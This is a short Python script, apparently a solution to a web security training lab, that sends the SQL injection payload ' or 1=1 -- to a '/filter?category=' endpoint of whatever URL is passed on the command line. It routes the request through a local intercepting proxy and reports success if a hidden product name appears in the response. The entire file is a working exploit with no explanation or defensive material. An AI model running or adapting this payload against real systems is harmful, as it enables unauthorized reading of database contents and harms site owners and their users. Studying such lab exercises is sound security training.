import requests 
import sys
import urllib3 

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli(url):
    uri = "/filter?category="
    print(url + uri + "' or 1=1 -- ")
    r = requests.get(url + uri + "' or 1=1 -- ")
    print(r.text)
    if "Pet Experience Days" in r.text: 
        return True
    else:
        return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        # payload = sys.argv[2].strip()
    except IndexError:
        print("usage: %s <url> <payload>" % sys.argv[0])
        print("example: %s www.example.com '1=1'" % sys.argv[0])
        sys.exit(-1)

    if exploit_sqli(url):
        print("sqli successfull")
    else: 
        print("sqli failure")
